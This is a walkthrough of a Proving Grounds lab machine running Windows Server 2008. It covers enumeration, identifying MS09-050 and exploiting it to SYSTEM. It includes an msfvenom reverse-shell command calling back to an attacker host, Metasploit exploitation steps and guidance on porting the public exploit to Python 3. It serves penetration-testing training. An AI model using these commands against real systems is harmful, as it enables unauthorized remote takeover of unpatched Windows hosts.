
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Windows Server 2008 SP1 (x86) **Difficulty:** Hard (community-rated Easy — essentially a known CVE against a legacy OS) **Initial Access:** MS09-050 SMBv2 remote code execution, exploited via a custom-ported Python 3 script with fresh msfvenom shellcode substituted for the original payload **Privilege Escalation:** None required — MS09-050 delivers SYSTEM-level execution **Final Access:** SYSTEM (direct)

### Key Techniques

- Full TCP + UDP Nmap scan
- Recognizing OS version from multiple Nmap outputs (smb-os-discovery, RDP NTLM info, DNS banner)
- Methodical service elimination to identify the actual attack vector
- DNS zone transfer attempt
- SMB enumeration (enum4linux, smbclient)
- RDP visual enumeration (browsing the login screen for leaked info)
- Researching an unfamiliar port number (5357/WSDAPI) as the final lead
- Cross-referencing OS version + port/service with known CVE/MS bulletins
- Vetting public exploit shellcode before running it
- Using ChatGPT (or similar) as a shellcode review aid for vetting
- Generating fresh msfvenom shellcode to replace untrusted in-exploit payload
- Porting a Python 2 exploit script to Python 3 (byte string conversions, print functions)
- Metasploit as a validated fallback when manual exploitation stalls

---

# Attack Path

```text
nmap -p- + UDP --top-ports=100
        ↓
OS Confirmed: Windows Server 2008 SP1 (x86)
        ↓
Service Elimination:
53 (DNS) → zone transfer fails
135 (RPC) → enumdomusers fails
139/445 (SMB) → no accessible shares, no useful enum4linux output
3389 (RDP) → no credential/username leak
5357 (WSDAPI) → unusual, unfamiliar
        ↓
Research Port 5357 → Microsoft Security Bulletin → MS09-050
        ↓
Searchsploit → Exploit-DB hit for MS09-050 (Python 2 script)
        ↓
Vet the Public Shellcode (ChatGPT assembly review)
        ↓
Generate Fresh msfvenom Shellcode — Replace Original Payload
        ↓
Port Python 2 Script to Python 3 (print, byte strings)
        ↓
Manual Attempt: Shellcode fires, but Meterpreter/wrong listener mismatch
        ↓
Metasploit Fallback: ms09_050 module → SYSTEM Shell
```

---

# 1. Nmap Enumeration

```bash
sudo nmap -Pn -n $IP -sC -sV -p- --open
sudo nmap -Pn -n $IP -sU --top-ports=100 --reason
```

```text
53/tcp     domain       Microsoft DNS 6.0.6001 (Windows Server 2008 SP1)
135/tcp    msrpc
139/tcp    netbios-ssn
445/tcp    microsoft-ds (Windows Server 2008 Standard 6001 SP1)
3389/tcp   ssl/ms-wbt-server (RDP — Target_Name: INTERNAL, Product_Version: 6.0.6001)
5357/tcp   http         Microsoft HTTPAPI 2.0 (SSDP/UPnP — "Service Unavailable")
49152-49158  msrpc (dynamic RPC ports)
```

UDP: Port 137 (NetBIOS Name Service) open — noted, not useful here.

**OS confirmed from multiple sources in a single scan:**

- `smb-os-discovery` → `Windows Server (R) 2008 Standard 6001 Service Pack 1`
- RDP NTLM info → `Product_Version: 6.0.6001`
- DNS banner → `Microsoft DNS 6.0.6001`

```bash
echo "<target_ip> internal" | sudo tee -a /etc/hosts
```

> [!tip] Recognition Pattern When a box runs Windows, the exact OS version often appears in multiple Nmap script outputs simultaneously (smb-os-discovery, RDP NTLM handshake, service banners). Cross-referencing all of them is worth doing early — a confirmed OS version is a direct input into CVE research, as this box demonstrates.

Also of note from Nmap: **SMB message signing is disabled** — a real-world indicator that NTLM relay attacks would be viable (not the path taken here, but worth recording as a finding pattern).

---

# 2. Service Elimination

Working through every port systematically, ruling each out or extracting value:

## Port 53 — DNS

```bash
dig @$IP axfr internal
```

Zone transfer fails — no hidden subdomains or additional targets disclosed.

## Port 135 — RPC

```bash
rpcclient -U '' -N $IP
```

Anonymous bind succeeds (gets a prompt), but `enumdomusers` returns nothing useful. Not a dead end conceptually (RPC client interaction has a large attack surface), but no clear path forward here.

## Ports 139/445 — SMB

```bash
enum4linux $IP
smbclient -N -L \\\\$IP\\
```

`smbclient` connects but no shares are accessible to anonymous/guest users. `enum4linux` returns no meaningful user or share information.

## Port 3389 — RDP

```bash
rdesktop internal
```

Connecting shows an expired SSL certificate warning (noted by Nmap — the cert expired before the current system date, a useful corroboration of the old OS). Accepting through the dialog reaches the Windows login screen — no username or session information visible.

> [!tip] Recognition Pattern Browsing a service even without credentials is a valid enumeration step — the login screen itself, certificate details, and visible UI elements can all add contextual detail. The exploration habit matters even when nothing specific turns up.

## Port 5357 — WSDAPI (the actual target)

Port 5357 is **WSDAPI** — the Web Services for Devices API, used by Windows for network device discovery/management. This isn't a common pentest port and requires research.

Googling "port 5357 security" immediately surfaces a Microsoft Security Bulletin from 2009 relevant to this exact service on Windows Server 2008. Cross-referencing with the confirmed OS version strongly suggests this is the intended vulnerability.

Searchsploit confirms:

```bash
searchsploit ms09-050
```

A Python exploit for **MS09-050** exists on Exploit-DB — an SMBv2 remote code execution vulnerability affecting Windows Vista/2008. The Metasploit module exists as well (`exploit/windows/smb/ms09_050_smb2_negotiate_func_index`).

> [!tip] Key Principle When every "standard" port has been eliminated with no useful path forward, unfamiliar/less-common ports are the likely intended vector. Googling the port number alongside context (the OS, "vulnerability", "security") is often all it takes — obscurity is not protection, and well-indexed vulnerability databases cover even niche service ports like 5357.

---

# 3. Manual Exploitation — Porting and Fixing the Public Script

The Exploit-DB PoC (MS09-050) is **Python 2** and contains untrusted hardcoded shellcode. Both issues need addressing before running it.

## Step 1 — Vet the public shellcode

Never run shellcode directly from a public exploit without reviewing it first. Two useful approaches:

**AI-assisted vetting:** Pasting the shellcode into ChatGPT (or similar) with a prompt to translate it to assembly and identify any calls that:

- access the local filesystem
- make outbound internet connections
- call any OS-level function not consistent with the claimed purpose

The original shellcode in this case appeared to be a legitimate sysenter hook/shellcode stager — no calls to local root access or unexpected outbound connections. Still, the next step (replacing it with fresh msfvenom output) is best practice regardless of vetting outcome.

> [!warning] Always Replace In-Exploit Shellcode With Fresh msfvenom Output Even if public shellcode vets clean, you cannot know whether it has been backdoored, is tuned for a different LHOST, or uses a payload type (e.g. Meterpreter) that won't match your listener (e.g. netcat). Generating your own with explicit parameters eliminates all of these uncertainties. This is a non-negotiable habit with any public exploit that embeds shellcode.

## Step 2 — Generate fresh shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 EXITFUNC=thread -f python
```

**Note:** the original exploit used `windows/meterpreter/reverse_tcp` — using a **Meterpreter** payload with a **netcat** listener is a common mismatch that produces exactly the "connected but no response to whoami" symptom seen here. Always confirm your payload type (stageless shell vs. Meterpreter stage) matches your listener type (netcat vs. Metasploit handler).

## Step 3 — Swap the shellcode and update variable names

Replace the original `shell` variable assignment with the new msfvenom output. Ensure the variable name matches what the rest of the script references (the original used `shell`; msfvenom defaults to `buf` — rename accordingly).

```python
shell =  b""
shell += b"\x90\x90\x90\x90..."  # NOP sled
shell += b"..."                   # fresh msfvenom output
```

The leading `b""` prefix is important — Python 3 requires byte strings explicitly (with `b` prefix) rather than treating string literals as bytes by default.

## Step 4 — Port the script to Python 3

Two main changes required:

**Print function syntax:**

```python
# Python 2
print '\nUsage: %s <target ip>\n' % sys.argv[0]

# Python 3
print('\nUsage: %s <target ip>\n' % sys.argv[0])
```

**Byte string literals on the buffer:** Any raw string literals used in `buff` assignments need a `b` prefix:

```python
# Python 2
buff = "\x00\x00\x03\x9e..."

# Python 3
buff = b"\x00\x00\x03\x9e..."
```

Find and replace in a text editor (Sublime Text's find/replace handles this efficiently for the many individual `+=` lines in the buffer construction).

> [!tip] Key Principle Porting a Python 2 exploit to Python 3 is a recurring, learnable skill rather than a special-case challenge. The three changes that cover the vast majority of simple exploit scripts: print statements → print() functions, string literals → byte strings (`b""`) wherever raw binary data is used, and occasionally `unicode` → `str`. Running the script and addressing each TypeError/SyntaxError in order is a reliable step-by-step approach when you don't know in advance which changes are needed.

## What happened in the manual attempt

The patched script ran and the exploit appeared to fire — SMB connection was made and the buffer sent successfully. However, no useful shell appeared on the listener. Post-mortem: the payload was a Meterpreter stager (`windows/meterpreter/reverse_tcp`) caught by a netcat listener — these are incompatible. A plain `windows/shell_reverse_tcp` payload with a netcat listener (or a Metasploit handler for the Meterpreter payload) would have worked.

---

# 4. Metasploit Fallback

When time is a factor and manual exploitation has stalled (or when the OSCP exam budget doesn't need to be preserved), Metasploit's module is the clean path:

```bash
sudo msfconsole
search ms09-050
use 0
show options
set LHOST tun0
set RHOSTS <target_ip>
run
```

```text
shell
whoami
# nt authority\system
```

Shell received as SYSTEM — MS09-050 delivers kernel-level code execution because the SMBv2 vulnerability affects the OS kernel's network stack, not a userland service running under a limited account.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|All "standard" ports produce dead ends in enumeration|Unusual/unfamiliar ports are likely the intended vector — research them directly|
|Unfamiliar port number in Nmap output|Search port number + OS context + "vulnerability" to surface known CVEs|
|Confirmed old Windows OS version|Cross-reference with MS bulletin database — legacy OS versions often have publicly known, fully weaponized exploits|
|Public exploit contains hardcoded shellcode|Always replace with fresh msfvenom output targeted to your listener|
|Public exploit is Python 2|Port to Python 3: print() functions, `b""` byte string prefixes on binary data|
|Exploit appears to connect but no shell response|Check for payload/listener type mismatch (Meterpreter vs. shell vs. netcat)|
|Manual exploit attempt stalls and time is a factor|Metasploit module is a valid fallback — knowing when to use it is a skill too|

---

# Key Lessons

> [!tip] Systematic Elimination Reveals the Real Target Working through every port in turn — ruling each out explicitly — is more reliable than instinct-driven port selection. Port 5357 only became the focus because everything else was methodically eliminated.

> [!tip] Research Unfamiliar Port Numbers Directly WSDAPI (5357) isn't in the standard pentest mental inventory, but a simple Google search of the port number + the known OS immediately surfaced an MS Security Bulletin and a viable CVE. An unfamiliar port is never a dead end until it's been researched.

> [!tip] Always Replace Public Exploit Shellcode Vet the existing shellcode for hostile calls, then replace it with fresh msfvenom output targeting your specific listener. This eliminates payload/listener mismatches, removes unknown backdoors, and forces you to understand what type of payload (shell vs. Meterpreter) you're actually deploying.

> [!tip] Payload/Listener Type Must Match A Meterpreter payload caught by a netcat listener produces exactly the "connected but silent" failure seen here. Always confirm: shell payload → netcat listener, or Meterpreter payload → Metasploit multi/handler.

> [!tip] Python 2 → Python 3 Is a Learnable, Repeatable Process Print syntax and byte string prefixes cover the majority of simple exploit porting work — treat errors as a guided checklist rather than an obstacle.

> [!tip] Knowing When to Use Metasploit Is Also a Skill In an exam context with a one-use limit, the decision to fall back to Metasploit is a deliberate strategic call, not a failure. On an unlimited practice box, using it as a validated reference to confirm the vulnerability fires correctly is always an option when time is a factor.